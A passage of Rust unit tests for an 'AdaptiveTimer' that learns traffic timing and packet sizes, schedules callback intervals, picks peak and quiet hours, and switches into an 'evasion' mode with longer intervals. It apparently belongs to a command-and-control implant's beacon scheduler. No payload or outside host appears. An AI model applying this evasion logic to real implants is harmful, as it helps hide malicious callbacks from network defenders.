        for i in 0..LEARNING_THRESHOLD {
            timer.observe(make_observation(i as u64 * 5, 512, 1024));
        }

        assert_eq!(timer.state(), TimerState::Active);
    }

    #[test]
    fn observation_count_tracks_correctly() {
        let timer = AdaptiveTimer::new(Duration::from_secs(30), 0.3);
        assert_eq!(timer.observation_count(), 0);

        for i in 0..10 {
            timer.observe(make_observation(i as u64, 100, 200));
        }
        assert_eq!(timer.observation_count(), 10);
    }

    #[test]
    fn sliding_window_evicts_old_observations() {
        let timer = AdaptiveTimer::new(Duration::from_secs(30), 0.3);

        // Insert more than MAX_OBSERVATIONS.
        for i in 0..MAX_OBSERVATIONS + 50 {
            timer.observe(make_observation(i as u64, 100, 200));
        }

        assert_eq!(timer.observation_count(), MAX_OBSERVATIONS);
    }

    #[test]
    fn evasion_mode_increases_interval() {
        // Use a timer with base=30s, min=1s so the active interval is comfortably
        // above the minimum and the EVASION_INTERVAL_MULTIPLIER has room to push
        // the evasion interval higher.
        let timer = AdaptiveTimer::with_bounds(
            Duration::from_secs(30),
            Duration::from_secs(1),
            Duration::from_secs(600),
            0.3,
        );

        // Feed observations to get to Active.  Use inter-arrival times of ~30s
        // so the learned interval is near the 30s base.
        for i in 0..LEARNING_THRESHOLD {
            let inter_arrival = 25 + (i % 10); // 25–34 seconds
            timer.observe(make_observation(i as u64 * inter_arrival as u64, 512, 1024));
        }

        let active_interval = timer.next_callback_time();
        timer.enter_evasion();
        let evasion_interval = timer.next_callback_time();

        assert!(
            evasion_interval > active_interval,
            "evasion interval ({:?}) should be > active interval ({:?})",
            evasion_interval,
            active_interval,
        );
    }

    #[test]
    fn exit_evasion_returns_to_active() {
        let timer = AdaptiveTimer::new(Duration::from_secs(30), 0.3);
        for i in 0..LEARNING_THRESHOLD {
            timer.observe(make_observation(i as u64 * 5, 512, 1024));
        }
        assert_eq!(timer.state(), TimerState::Active);

        timer.enter_evasion();
        assert_eq!(timer.state(), TimerState::Evasion);

        timer.exit_evasion();
        assert_eq!(timer.state(), TimerState::Active);
    }

    #[test]
    fn reset_clears_everything() {
        let timer = AdaptiveTimer::new(Duration::from_secs(30), 0.3);
        for i in 0..LEARNING_THRESHOLD {
            timer.observe(make_observation(i as u64 * 5, 512, 1024));
        }
        assert_eq!(timer.state(), TimerState::Active);

        timer.reset();
        assert_eq!(timer.state(), TimerState::Learning);
        assert_eq!(timer.observation_count(), 0);
        assert!(timer.profile().is_none());
    }

    #[test]
    fn recommended_packet_size_is_bounded() {
        let timer = AdaptiveTimer::new(Duration::from_secs(30), 0.3);
        for i in 0..LEARNING_THRESHOLD {
            timer.observe(make_observation(i as u64 * 5, 512, 1024));
        }

        for _ in 0..100 {
            let size = timer.recommended_packet_size();
            assert!(size >= 64, "packet size {} < 64", size);
            assert!(size <= 65535, "packet size {} > 65535", size);
        }
    }

    #[test]
    fn gaussian_random_produces_reasonable_values() {
        let mean = 30.0_f64;
        let stddev = 5.0_f64;
        let mut values = Vec::new();
        for _ in 0..1000 {
            values.push(gaussian_random(mean, stddev));
        }

        let computed_mean = compute_mean(&values);
        let computed_stddev = compute_stddev(&values);

        // The sample mean should be within 10% of the target mean.
        assert!(
            (computed_mean - mean).abs() / mean < 0.15,
            "sample mean {} too far from target {}",
            computed_mean,
            mean,
        );

        // The sample stddev should be within 50% of the target stddev.
        assert!(
            (computed_stddev - stddev).abs() / stddev < 0.5,
            "sample stddev {} too far from target {}",
            computed_stddev,
            stddev,
        );
    }

    #[test]
    fn simple_random_produces_values_in_range() {
        for _ in 0..1000 {
            let v = simple_random();
            assert!(v >= 0.0 && v < 1.0, "simple_random() = {} not in [0, 1)", v);
        }
    }

    #[test]
    fn compute_mean_empty_is_zero() {
        assert_eq!(compute_mean(&[]), 0.0);
    }

    #[test]
    fn compute_stddev_single_value_is_zero() {
        assert_eq!(compute_stddev(&[42.0]), 0.0);
    }

    #[test]
    fn peak_detection_identifies_peaks() {
        // Build a histogram with clear peaks at hours 9–12 and 14–16.
        let mut histogram = [10u64; HOUR_BINS];
        histogram[9] = 100;
        histogram[10] = 120;
        histogram[11] = 110;
        histogram[12] = 90;
        histogram[14] = 80;
        histogram[15] = 95;
        histogram[16] = 85;

        let timer = AdaptiveTimer::new(Duration::from_secs(30), 0.3);
        let (peaks, _quiets) = timer.detect_peak_quiet_hours(&histogram);

        assert!(!peaks.is_empty(), "should detect at least one peak range");

        // At least one peak should include hour 10.
        let includes_10 = peaks.iter().any(|p| p.start <= 10 && p.end >= 10);
        assert!(includes_10, "expected a peak including hour 10, got {:?}", peaks);
    }

    #[test]
    fn quiet_detection_identifies_quiet_hours() {
        let mut histogram = [50u64; HOUR_BINS];
        histogram[2] = 1;
        histogram[3] = 2;
        histogram[4] = 1;

        let timer = AdaptiveTimer::new(Duration::from_secs(30), 0.3);
        let (_peaks, quiets) = timer.detect_peak_quiet_hours(&histogram);

        assert!(!quiets.is_empty(), "should detect quiet hours");

        let includes_3 = quiets.iter().any(|q| q.start <= 3 && q.end >= 3);
        assert!(includes_3, "expected a quiet range including hour 3");
    }

    #[test]
    fn integration_100_observations_produces_realistic_intervals() {
        let timer = AdaptiveTimer::with_bounds(
            Duration::from_secs(30),
            Duration::from_secs(5),
            Duration::from_secs(600),
            0.5,
        );

        // Feed 100 synthetic observations with realistic inter-arrival
        // times (5–60 seconds) and packet sizes (200–2000 bytes).
        let mut elapsed = 0u64;
        for i in 0..100 {
            let inter_arrival = 5 + (i * 7 + 13) % 56; // 5–60 seconds
            elapsed += inter_arrival;
            let pkt_size: usize = (200 + (i * 37 + 11) % 1800) as usize; // 200–2000 bytes
            timer.observe(make_observation(elapsed, pkt_size / 2, pkt_size / 2));
        }

        // Should have transitioned to Active.
        assert_eq!(timer.state(), TimerState::Active);

        // Verify that the learned profile exists.
        let profile = timer.profile().expect("should have a profile");
        assert!(profile.inter_arrival_mean > Duration::ZERO);
        assert!(profile.average_packet_size > 0.0);

        // Verify intervals are within bounds.
        for _ in 0..50 {
            let dur = timer.next_callback_time();
            assert!(
                dur >= Duration::from_secs(5),
                "interval {:?} < min 5s",
                dur,
            );
            assert!(
                dur <= Duration::from_secs(600),
                "interval {:?} > max 600s",
                dur,
            );
        }
    }

    #[test]
    fn adaptive_timer_never_exceeds_bounds_in_any_state() {
        let timer = AdaptiveTimer::with_bounds(
            Duration::from_secs(30),
            Duration::from_secs(10),
            Duration::from_secs(300),
            0.5,
        );

        // Test Learning state.
        for _ in 0..100 {
            let dur = timer.next_callback_time();
            assert!(dur >= Duration::from_secs(10));
            assert!(dur <= Duration::from_secs(300));
        }

        // Transition to Active.
        for i in 0..LEARNING_THRESHOLD {
            timer.observe(make_observation(i as u64 * 5, 512, 1024));
        }
        assert_eq!(timer.state(), TimerState::Active);

        for _ in 0..100 {
            let dur = timer.next_callback_time();
            assert!(dur >= Duration::from_secs(10));
            assert!(dur <= Duration::from_secs(300));
        }

        // Test Evasion state.
        timer.enter_evasion();
        for _ in 0..100 {
            let dur = timer.next_callback_time();
            assert!(dur >= Duration::from_secs(10));
            assert!(dur <= Duration::from_secs(300));
        }
    }
}
